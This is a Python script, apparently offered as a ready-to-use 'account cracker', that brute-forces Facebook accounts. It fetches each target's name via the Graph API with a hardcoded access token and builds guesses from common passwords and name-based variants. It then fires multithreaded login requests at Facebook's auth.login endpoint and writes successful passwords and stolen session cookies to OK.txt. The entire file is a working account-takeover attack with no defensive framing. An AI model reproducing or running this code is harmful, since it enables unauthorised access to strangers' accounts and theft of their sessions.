import os, json, requests, urllib.parse
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor

# ─── Banner ─────────────────────────────
banner = """
\033[1;91m██╗\033[1;92m██████╗ \033[1;93m███████╗ \033[1;94m█████╗ \033[1;95m███╗   ██╗     \033[1;96m█████╗ \033[1;91m██╗  ██╗\033[1;92m███╗   ███╗\033[1;96m███████╗\033[1;94m██████╗\033[0m
\033[1;91m██║\033[1;92m██╔══██╗\033[1;93m██╔════╝\033[1;94m██╔══██╗\033[1;95m████╗  ██║    \033[1;96m██╔══██╗\033[1;91m██║  ██║\033[1;92m████╗ ████║\033[1;96m██╔════╝\033[1;94m██╔══██╗\033[0m
\033[1;91m██║\033[1;92m██████╔╝\033[1;93m█████╗  \033[1;94m███████║\033[1;95m██╔██╗ ██║    \033[1;96m███████║\033[1;91m███████║\033[1;92m██╔████╔██║\033[1;96m█████╗  \033[1;94m██║  ██║\033[0m
\033[1;91m██║\033[1;92m██╔══██╗\033[1;93m██╔══╝  \033[1;94m██╔══██║\033[1;95m██║╚██╗██║    \033[1;96m██╔══██║\033[1;91m██╔══██║\033[1;92m██║╚██╔╝██║\033[1;96m██╔══╝  \033[1;94m██║  ██║\033[0m
\033[1;91m██║\033[1;92m██║  ██║\033[1;93m██║     \033[1;94m██║  ██║\033[1;95m██║ ╚████║    \033[1;96m██║  ██║\033[1;91m██║  ██║\033[1;92m██║ ╚═╝ ██║\033[1;96m███████╗\033[1;94m██████╔╝\033[0m
\033[1;91m╚═╝\033[1;92m╚═╝  ╚═╝\033[1;93m╚═╝     \033[1;94m╚═╝  ╚═╝\033[1;95m╚═╝  ╚═══╝    \033[1;96m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═╝\033[1;92m╚═╝     \033[1;94m╚═╝\033[1;96m╚══════╝\033[1;95m╚═════╝\033[0m
"""

def menu_box():
    print('╔═' + '═' * 45 + '═╗')
    print(f'║       \033[1;92m★ OLD ACCOUNT CRACKER MENU ★       \033[0m║')
    print('╠═' + '═' * 45 + '═╣')
    print(f'║ [1] File Clone BruteForce (custom path)       ║')
    print(f'║ [2] Single UID BruteForce                     ║')
    print(f'║ [0] Exit                                      ║')
    print('╠═' + '═' * 45 + '═╣')
    print(f'║ Creator: Irfan Ahmed | Team: Cyber Force 756 ║')
    print('╚═' + '═' * 45 + '═╝')

ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
FIXED_PASS = ['123456','123123','111222','12345678','123456789','111111','112233','555555','222222','333333','password']

def fetch_name(uid):
    try:
        r = requests.get(f"https://graph.facebook.com/{uid}?fields=name&access_token={ACCESS_TOKEN}", timeout=5)
        return r.json().get("name")
    except:
        return None

def build_passwords(uid, name=None):
    pwds = FIXED_PASS.copy()
    if name:
        n = name.replace(" ", "").lower()
        pwds += [f"{n}123", f"{n}@123", f"{n}2024", f"{n}01", f"{n}1122", n + uid[-4:]]
    return pwds

def try_login(uid, pwd):
    buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, "https://b-api.facebook.com/method/auth.login")
    curl.setopt(curl.POST, 1)
    curl.setopt(curl.POSTFIELDS, urllib.parse.urlencode({
        'email': uid,
        'password': pwd,
        'access_token': ACCESS_TOKEN,
        'format': 'json',
        'sdk_version': '2',
        'generate_session_cookies': '1',
        'locale': 'en_US',
        'method': 'auth.login'
    }))
    curl.setopt(curl.WRITEDATA, buffer)
    curl.setopt(curl.TIMEOUT, 10)
    curl.setopt(curl.HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 10)',
        'Content-Type: application/x-www-form-urlencoded'
    ])

    try:
        curl.perform()
        result = json.loads(buffer.getvalue().decode())
        if "session_key" in result:
            cookie = "; ".join([f"{c['name']}={c['value']}" for c in result["session_cookies"]])
            print(f"\033[1;92m[OK] {uid} | {pwd} | 🍪 {cookie}\033[0m")
            open("OK.txt", "a").write(f"{uid}|{pwd}|{cookie}\n")
            return True
        elif "checkpoint" in result.get("error_msg", "").lower():
            print(f"\033[1;93m[CP] {uid} | {pwd}\033[0m")
            open("CP.txt", "a").write(f"{uid}|{pwd}\n")
            return True
    except Exception as e:
        print(f"\033[1;91m[ERR] {uid} | {pwd} | {str(e).split(':')[0]}\033[0m")
    finally:
        curl.close()
        buffer.close()

    return False

def bruteforce(uid):
    name = fetch_name(uid)
    pwds = build_passwords(uid, name)
    for pwd in pwds:
        if try_login(uid, pwd):
            break

def file_mode():
    try:
        path = input("📂 Enter full path to UID file: ")
        if not os.path.isfile(path):
            print("❌ File not found!")
            return
        with open(path, 'r') as f:
            uids = f.read().splitlines()
    except Exception as e:
        print(f"❌ Failed to read file: {str(e)}")
        return
    print(f"\n🔍 Loaded {len(uids)} UIDs\n")
    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(bruteforce, uids)

def single_mode():
    uid = input("🔑 Enter UID: ")
    if uid.isdigit():
        bruteforce(uid)
    else:
        print("❌ Invalid UID")

def main():
    os.system("clear" if os.name != "nt" else "cls")
    print(banner)
    menu_box()
    choice = input("\n🧭 Option: ")
    if choice == "1":
        file_mode()
    elif choice == "2":
        single_mode()
    elif choice == "0":
        exit()
    else:
        print("❌ Invalid option!")

if __name__ == "__main__":
    main()
